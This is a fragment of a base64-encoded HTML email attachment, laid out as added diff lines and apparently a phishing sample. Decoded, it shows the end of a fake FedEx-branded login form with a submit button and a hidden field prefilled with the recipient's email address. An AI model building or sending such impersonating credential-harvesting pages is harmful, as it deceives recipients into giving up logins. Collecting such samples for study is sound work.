+CQkJCQk8L2Rpdj4NCgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTx0cj48dGQgc3R5bGU9Imhl
+aWdodDo3cHg7Ij48L3RkPjwvdHI+DQoJCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTx0YWJsZSBh
+bGlnbj0icmlnaHQiIGNlbGxzcGFjaW5nPSIwIj48dHI+DQoJCQkJCQkJPHRkPg0KCQkJCQkJ
+CQk8Zm9udCBmYWNlPSJhcmlhbCIgc2l6ZT0iMiIgY29sb3I9IiNGRkYiPiA8L2ZvbnQ+DQoJ
+CQkJCQkJPC90ZD4NCgkJCQkJCQk8L3RyPjwvdGFibGU+DQoJCQkJCQk8L3RkPjwvdHI+DQoJ
+CQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6MjBweDsiPjwvdGQ+PC90cj4NCgkJCQkJCTx0
+cj48dGQ+DQoJCQkJCQkJPGRpdiBhbGlnbj0icmlnaHQiPg0KCQkJCQkJCQk8aW5wdXQgdHlw
+ZT0ic3VibWl0IiB2YWx1ZT0iTE9HSU4iPg0KCQkJCQkJCTwvZGl2Pg0KCQkJCQkJPC90ZD48
+L3RyPg0KCQkJCQkJPHRyPjx0ZD4NCgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTx0cj48dGQg
+c3R5bGU9ImhlaWdodDoyMHB4OyI+DQoJCQkJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFt
+ZT0ibG9naW4iIHZhbHVlPSJqb3NlQG1vbmtleS5vcmciPg0KCQkJCQkJCTwvZm9ybT4NCgkJ
+CQkJCTwvdGQ+PC90cj4NCgkJCQkJCTwvdGFibGU+DQoJCQkJCTwvdGQ+PC90cj4NCgk8L3Rh
+YmxlPg0KDQoNCg0KPC9kaXY+DQo8L3RkPjwvdHI+DQo8dHI+PHRkIGhlaWdodD0iNCUiIGJn
+Y29sb3I9IiMxODE4MTgiPg0KCTxkaXYgYWxpZ249ImNlbnRlciI+DQoJCTxmb250IGZhY2U9
+ImFyaWFsIiBzaXplPSIyIiBjb2xvcj0iI0ZGRiI+DQoJCQnCqSBGZWRFeCAxOTk1LTIwMjMg
+fCBTaXRlIE1hcCB8IFRlcm1zIG9mIFVzZSB8UHJpdmFjeSAmIFNlY3VyaXR5IHwgQWxsIHJp
+Z2h0cyByZXNlcnZlZA0KCQk8L2ZvbnQ+DQoJPC9kaXY+DQo8L3RkPjwvdHI+DQo8L3RhYmxl
+Pg0KPC9ib2R5Pg0KPC9odG1sPg0K
+
+------=_NextPart_000_0012_2063FA6E.65418ECB--
